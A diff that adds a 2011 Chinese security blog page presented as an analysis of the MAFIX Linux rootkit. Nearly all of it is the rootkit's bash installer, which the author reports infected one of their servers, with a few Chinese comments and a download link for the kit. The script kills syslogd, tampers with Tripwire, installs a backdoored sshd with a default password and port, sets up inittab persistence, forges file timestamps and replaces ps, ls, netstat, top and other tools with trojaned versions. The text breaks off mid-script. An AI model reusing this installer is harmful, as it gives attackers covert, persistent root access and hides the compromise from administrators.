@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>MAFIX - Linux 2.6 rootkit分析 | key1088 Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="MAFIX - Linux 2.6 rootkit这后门很贱，服务器中过一次，属于这个后门的改版。那个添加了模块。下载地址：https:&#x2F;&#x2F;forum.eviloctal.com&#x2F;attachment.php?aid&#x3D;13419内容：MAXFIX---HOW-TO---mafix---mafixlibs &amp;nbsp;---root&amp;nbsp;下面为root的内容，也就是安装脚本。#!&#x2F;bin&#x2F;ba">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MAFIX - Linux 2.6 rootkit分析">
+<meta property="og:url" content="https://key1088.github.io/2011/06/28/MAFIX---Linux-2.6-rootkit%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="key1088 Blog">
+<meta property="og:description" content="MAFIX - Linux 2.6 rootkit这后门很贱，服务器中过一次，属于这个后门的改版。那个添加了模块。下载地址：https:&#x2F;&#x2F;forum.eviloctal.com&#x2F;attachment.php?aid&#x3D;13419内容：MAXFIX---HOW-TO---mafix---mafixlibs &amp;nbsp;---root&amp;nbsp;下面为root的内容，也就是安装脚本。#!&#x2F;bin&#x2F;ba">
+<meta property="og:locale">
+<meta property="article:published_time" content="2011-06-28T09:35:00.000Z">
+<meta property="article:modified_time" content="2025-01-24T06:26:09.576Z">
+<meta property="article:author" content="key1088">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="key1088 Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">key1088 Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">2020到2060会发生什么，这40年内会有哪些变化呢</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Suche"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://key1088.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-MAFIX---Linux-2.6-rootkit分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2011/06/28/MAFIX---Linux-2.6-rootkit%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2011-06-28T09:35:00.000Z" itemprop="datePublished">2011-06-28</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      MAFIX - Linux 2.6 rootkit分析
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>MAFIX - Linux 2.6 rootkit</p><p>这后门很贱，服务器中过一次，属于这个后门的改版。那个添加了模块。</p><p>下载地址：</p><p>https://forum.eviloctal.com/attachment.php?aid=13419</p><p>内容：</p><p>MAXFIX</p><p>---HOW-TO</p><p>---mafix</p><p>---mafixlibs &nbsp;</p><p>---root</p><p>&nbsp;</p><p>下面为root的内容，也就是安装脚本。</p><p>#!/bin/bash</p><p>######################</p><p># mafix 0.2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#</p><p># fud 2009/07/15 &nbsp; &nbsp; #</p><p>######################</p><p>&nbsp;</p><p>BASEDIR=`pwd`</p><p>export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</p><p>BLK=' [1;30m'</p><p>MAG=' [1;35m'</p><p>CYN=' [1;30m'</p><p>RED='^[[1;32m'</p><p>DMAG=' [1;37m'</p><p>RES=' [0m'</p><p>&nbsp;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; /__/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; ${DMAG} &nbsp; ___ &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; /__/| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:: &nbsp; &nbsp; &nbsp; / &nbsp;/:: &nbsp; &nbsp; &nbsp; / &nbsp;/:/_ &nbsp;${DMAG} &nbsp;/ &nbsp;/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:|: &nbsp; &nbsp; / &nbsp;/:/: &nbsp; &nbsp; / &nbsp;/:/ / ${DMAG} / &nbsp;/:/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;__|__|:|: &nbsp; / &nbsp;/:/~/:: &nbsp; / &nbsp;/:/ /:/ ${DMAG}/__/:: &nbsp; &nbsp;${CYN} &nbsp;__|__|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} /__/::::| : /__/:/ /:/: /__/:/ /:/ &nbsp;${DMAG}__/:__ ${CYN} /__/::::____${RES}&quot;</p><p>echo &quot;${CYN}  &nbsp;:~~__/  &nbsp;:/:/__/  &nbsp;:/:/ &nbsp; ${DMAG} &nbsp;  &nbsp;:/ ${CYN} &nbsp; ~~~::::/${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;::/ &nbsp; &nbsp; &nbsp;  &nbsp;::/ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;__::/${CYN} &nbsp; &nbsp; |~~|:|~~ ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;  &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;/__/:/ ${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; ${DMAG} &nbsp; &nbsp;__/ &nbsp;${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; ${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; |__|/ &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG}${RES}&quot;</p><p>echo &quot;${DMAG}- the ferrari of rootkits - ${RES}&quot;</p><p>sleep 5</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} extracting libs...${RES}&quot;</p><p>tar zxf mafixlibs</p><p>if [ &quot;$(whoami)&quot; != &quot;root&quot; ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} you need to be root to backdoor the box...${RES}&quot;</p><p>&nbsp; &nbsp;exit</p><p>fi</p><p>cd $BASEDIR</p><p>sleep 1</p><p>killall -9 syslogd &gt;/dev/null 2&gt;&amp;1</p><p>startime=`date +%S`</p><p>&nbsp;</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} backdooring box...${RES}&quot;</p><p>SYSLOGCONF=&quot;/etc/syslog.conf&quot;</p><p>REMOTE=`grep -v &quot;^#&quot; &quot;$SYSLOGCONF&quot; | grep -v &quot;^$&quot; | grep &quot;@&quot; | cut -d '@' -f 2`</p><p>if [ ! -z &quot;$REMOTE&quot; ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Remote logging found! I hope you got access to these box:${RES}&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>&nbsp; &nbsp; &nbsp; &nbsp; for host in $REMOTE; do</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo -n &quot; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo $host</p><p>&nbsp; &nbsp; &nbsp; &nbsp; done</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo ' ${CYN}coz this box is logging to it${RES}'</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no remote logging found...${RES}&quot;</p><p>fi</p><p>uname=`uname -n`</p><p>twd=/var/lib/tripwire/$uname.twd</p><p>if [ -d /etc/tripwire ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} WARNING: TRIPWIRE FOUND!${RES}&quot;</p><p>if [ -f /var/lib/tripwire/$uname.twd ]; then</p><p>&nbsp; &nbsp; &nbsp; chattr -isa $twd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#去保护，如果有的话，覆盖，chattr +isa 写保护</p><p>&nbsp; &nbsp;else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no tripwire db found...${RES}&quot;</p><p>&nbsp; &nbsp;fi</p><p>else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no tripwire was detected..${RES}&quot;</p><p>fi</p><p># restoring login</p><p>if [ -f /sbin/xlogin ]; then</p><p>&nbsp; &nbsp;chattr -isa /sbin/xlogin</p><p>&nbsp; &nbsp;chattr -isa /bin/login</p><p>&nbsp; &nbsp;mv -f /sbin/xlogin /bin/login</p><p>&nbsp; &nbsp;chmod 7455 /bin/login</p><p>&nbsp; &nbsp;chattr +isa /bin/login</p><p>fi</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} installing trojans...${RES}&quot;</p><p>if [ -f /etc/sh.conf ]; then</p><p>&nbsp; chattr -isa /etc/sh.conf</p><p>&nbsp; rm -rf /etc/sh.conf</p><p>fi</p><p># checking if we got needed libs and filez</p><p>if [ ! -f /lib/libproc.a ]; then</p><p>&nbsp; &nbsp;mv bin/lib/libproc.a /lib/ 2&gt;/dev/null</p><p>fi</p><p>&nbsp;</p><p>if [ ! -f /lib/libproc.so.2.0.6 ]; then</p><p>&nbsp; &nbsp;mv bin/lib/libproc.so.2.0.6 /lib/ 2&gt;/dev/null</p><p>fi</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} hold on...${RES}&quot;</p><p>/sbin/ldconfig &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>if [ ! -f /usr/bin/md5sum ]; then</p><p>&nbsp; &nbsp;touch -acmr /bin/ls bin/md5sum</p><p>&nbsp; &nbsp;cp bin/md5sum /usr/bin/md5sum</p><p>fi</p><p>DEFPASS=race</p><p>DEFPORT=11111</p><p>if test -n &quot;$1&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $1${RES}&quot;</p><p>&nbsp; &nbsp;cd $BASEDIR/bin</p><p>&nbsp; &nbsp;echo -n $1|md5sum &gt; /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#生成密码文件</p><p>else</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $DEFPASS${RES}&quot;</p><p>&nbsp; &nbsp;echo -n $DEFPASS|md5sum &gt; /etc/sh.conf</p><p>fi</p><p>&nbsp;</p><p>touch -acmr /bin/ls /etc/sh.conf</p><p>chown -f root:root /etc/sh.conf</p><p>chattr +isa /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#写保护</p><p>&nbsp;</p><p>if test -n &quot;$2&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Port:${DMAG} $2${RES}&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $2&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;echo &quot;3 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;echo &quot;4 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf 2&gt;/dev/null</p><p>else</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $DEFPORT${RES}&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $DEFPORT&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp;&nbsp;</p><p>&nbsp; &nbsp;echo &quot;3 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;echo &quot;4 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $B
+ASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf 2&gt;/dev/null</p><p>fi</p><p>&nbsp;</p><p>if [ -f /lib/lidps1.so ]; then</p><p>&nbsp; chattr -isa /lib/lidps1.so</p><p>&nbsp; rm -rf /lib/lidps1.so</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/hosts.h ]; then</p><p>&nbsp; chattr -isa /usr/include/hosts.h</p><p>&nbsp; rm -rf /usr/include/hosts.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/file.h ]; then</p><p>&nbsp; chattr -isa /usr/include/file.h</p><p>&nbsp; rm -rf /usr/include/file.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/log.h ]; then</p><p>&nbsp; chattr -isa /usr/include/log.h</p><p>&nbsp; rm -rf /usr/include/log.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/proc.h ]; then</p><p>&nbsp; chattr -isa /usr/include/proc.h</p><p>&nbsp; rm -rf /usr/include/proc.h</p><p>fi</p><p>&nbsp;</p><p>cd $BASEDIR</p><p>mv $BASEDIR/bin/headers/lidps1.so /lib/lidps1.so 2&gt;/dev/null</p><p>touch -acmr /bin/ls /lib/lidps1.so &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #修改文件时间与/bin/ls 时间相同</p><p>touch -acmr /bin/ls $BASEDIR/bin/headers/* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#修改时间</p><p>mv $BASEDIR/bin/headers/* &nbsp;/usr/include/ 2&gt;/dev/null</p><p>&nbsp;</p><p># Ok lets start creating dirs</p><p>&nbsp;</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>if [ -d /lib/libsh.so ]; then</p><p>&nbsp; &nbsp;chattr -isa /lib/libsh.so</p><p>&nbsp; &nbsp;chattr -isa /lib/libsh.so/*</p><p>&nbsp; &nbsp;rm -rf /lib/libsh.so</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/lib/libsh ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/lib/libsh</p><p>&nbsp; &nbsp;chattr -isa /usr/lib/libsh/*</p><p>&nbsp; &nbsp;rm -rf /usr/lib/libsh/*</p><p>fi</p><p>&nbsp;</p><p>mkdir $SSHDIR 2&gt;/dev/null</p><p>touch -acmr /bin/ls $SSHDIR</p><p>mkdir $HOMEDIR 2&gt;/dev/null</p><p>touch -acmr /bin/ls $HOMEDIR</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>mv .sh/* $SSHDIR/ 2&gt;/dev/null</p><p>mv .sh/.bashrc $HOMEDIR 2&gt;/dev/null</p><p>&nbsp;</p><p>if [ -f /sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /sbin/ttymon ]; then</p><p>&nbsp; &nbsp;chattr -isa /sbin/ttymon</p><p>&nbsp; &nbsp;rm -rf /sbin/ttymon</p><p>fi</p><p>&nbsp;</p><p>mv $SSHDIR/sshd /sbin/ttyload 2&gt;/dev/null</p><p>chmod a+xr /sbin/ttyload 2&gt;/dev/null</p><p>chmod o-w /sbin/ttyload 2&gt;/dev/null</p><p>touch -acmr /bin/ls /sbin/ttyload</p><p>chattr +isa /sbin/ttyload</p><p>kill -9 `pidof ttyload` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>mv $BASEDIR/bin/ttymon /sbin/ttymon 2&gt;/dev/null</p><p>chmod a+xr /sbin/ttymon 2&gt;/dev/null</p><p>touch -acmr /bin/ls /sbin/ttymon</p><p>chattr +isa /sbin/ttymon</p><p>kill -9 `pidof ttymon` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>cp /bin/bash $SSHDIR</p><p>&nbsp;</p><p># INITTAB SHUFFLING</p><p>&nbsp;</p><p>chattr -isa /etc/inittab</p><p>cat /etc/inittab |grep -v ttyload|grep -v getty &gt; /tmp/.init1</p><p>cat /etc/inittab |grep getty &gt; /tmp/.init2</p><p>echo &quot;# Loading standard ttys&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;0:2345:once:/usr/sbin/ttyload&quot; &gt;&gt; /tmp/.init1</p><p>cat /tmp/.init2 &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# modem getty.&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# mo:235:respawn:/usr/sbin/mgetty -s 38400 modem&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# fax getty (hylafax)&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# mo:35:respawn:/usr/lib/fax/faxgetty /dev/modem&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# vbox (voice box) getty&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# I6:35:respawn:/usr/sbin/vboxgetty -d /dev/ttyI6&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# I7:35:respawn:/usr/sbin/vboxgetty -d /dev/ttyI7&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# end of /etc/inittab&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;/sbin/ttyload -q &gt;/dev/null 2&gt;&amp;1&quot; &gt; /usr/sbin/ttyload</p><p>echo &quot;/sbin/ttymon &gt;/dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>touch -acmr /bin/ls /usr/sbin/ttyload</p><p>chmod +x /usr/sbin/ttyload 2&gt;/dev/null</p><p>chattr +isa /usr/sbin/ttyload</p><p>/usr/sbin/ttyload &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>touch -amcr /etc/inittab /tmp/.init1</p><p>mv -f /tmp/.init1 /etc/inittab 2&gt;/dev/null</p><p>rm -rf /tmp/.init2</p><p>&nbsp;</p><p># MAKING SURE WE GOT IT BACKDORED RIGHT !</p><p>&nbsp;</p><p>if [ ! &quot;`grep ttyload /etc/inittab`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} inittab broken, sshd wont be loaded upon reboot :(${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p># Say hello to md5sum fixer boys n gurls !</p><p>&nbsp;</p><p>if [ -f /sbin/ifconfig ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /sbin/ifconfig &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/ps ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/ps &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/ls ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/ls &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/netstat ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/netstat &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/find ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/find &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/top ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/top &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/sbin/lsof ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/sbin/lsof &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/slocate ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/slocate &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/dir ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/dir &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/md5sum ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/md5sum &gt;&gt; .shmd5</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>if [ ! -f /dev/srd0 ]; then</p><p>&nbsp; ./encrypt -e .shmd5 /dev/srd0</p><p>&nbsp; touch -acmr /bin/ls /dev/srd0</p><p>&nbsp; chattr a+r /dev/srd0</p><p>&nbsp; chown -f root:root /dev/srd0</p><p>fi</p><p>&nbsp;</p><p>rm -rf .shmd5</p><p>&nbsp;</p><p>&nbsp;</p><p># time change bitch</p><p>&nbsp;</p><p>touch -acmr /sbin/ifconfig ifconfig &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/ps ps &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/ls ls &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/netstat netstat &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/find find &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/top top &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/sbin/lsof lsof &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /sbin/syslogd syslogd &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/slocate slocate &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/dir dir &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/md5sum md5sum &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/pstree pstree &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>&nbsp;</p><p># Backdoor ps/top/du/ls/netstat/etc..</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>&nbsp;</p><p>BACKUP=/usr/lib/libsh/.backup</p><p>mkdir $BACKUP 2&gt;/dev/null</p><p>&nbsp;</p><p># ps ...</p><p>if [ -f /usr/bin/ps ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/ps</p><p>&nbsp; &nbsp;cp /usr/bin/ps $BACKUP</p><p>&nbsp; &nbsp;mv -f ps /usr/bin/ps 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/ps</p><p>fi</p><p>&nbsp;</p><p>if [ -f /bin/ps ]; then</p><p>&nbsp; &nbsp;chattr -isa /bin/ps</p><p>&nbsp; &nbsp;cp /bin/ps $BACKUP</p><p>&nbsp; &nbsp;mv -f ps /bin/ps 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /bin/ps</p><p>fi</p><p>&nbsp;</p><p># ifconfig ...</p><p>chattr -isa /sbin/ifconfig</p><p>cp /sbin/ifconfig $BACKUP</p><p>mv -f ifconfig /sbin/ifconfig 2&gt;/dev/null</p><p>chattr +isa
+/sbin/ifconfig</p><p>&nbsp;</p><p># netstat ...</p><p>if [ -f /usr/sbin/netstat ]; then</p><p>&nbsp; chattr -isa /usr/sbin/netstat</p><p>&nbsp; mv -f netstat /usr/sbin/netstat 2&gt;/dev/null</p><p>&nbsp; chattr +isa /usr/sbin/netstat</p><p>fi</p><p>&nbsp;</p><p>chattr -isa /bin/netstat</p><p>cp /bin/netstat $BACKUP</p><p>mv -f netstat /bin/netstat 2&gt;/dev/null</p><p>chattr +isa /bin/netstat</p><p>&nbsp;</p><p># top ...</p><p>if [ -f /usr/bin/top ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/top</p><p>&nbsp; &nbsp;cp /usr/bin/top $BACKUP</p><p>&nbsp; &nbsp;mv -f top /usr/bin/top 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/top</p><p>&nbsp; &nbsp;if [ -f /lib/libncurses.so.5 ]; then</p><p>&nbsp; &nbsp; &nbsp; ln -s /lib/libncurses.so.5 /lib/libncurses.so.4 2&gt;/dev/null</p><p>&nbsp; &nbsp;fi</p><p>&nbsp; &nbsp;if [ -f /usr/lib/libncurses.so.5 ]; then</p><p>&nbsp; &nbsp; &nbsp; ln -s /usr/lib/libncurses.so.5 /lib/libncurses.so.4 2&gt;/dev/null</p><p>&nbsp; &nbsp;fi</p><p>fi</p><p>&nbsp;</p><p># slocate ...</p><p>if [ -f /usr/bin/slocate ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/slocate</p><p>&nbsp; &nbsp;cp /usr/bin/slocate $BACKUP</p><p>&nbsp; &nbsp;mv -f slocate /usr/bin/slocate 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/slocate</p><p>fi</p><p>&nbsp;</p><p># ls ...</p><p>chattr -isa /bin/ls</p><p>cp /bin/ls $BACKUP</p><p>mv -f ls /bin/ls 2&gt;/dev/null</p><p>chattr +isa /bin/ls</p><p>&nbsp;</p><p># find ...</p><p>if [ -f /usr/bin/find ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/find</p><p>&nbsp; &nbsp;cp /usr/bin/find $BACKUP</p><p>&nbsp; &nbsp;mv -f find /usr/bin/find 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/find</p><p>fi</p><p>&nbsp;</p><p># dir ...</p><p>if [ -f /usr/bin/dir ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/dir</p><p>&nbsp; &nbsp;cp /usr/bin/dir $BACKUP</p><p>&nbsp; 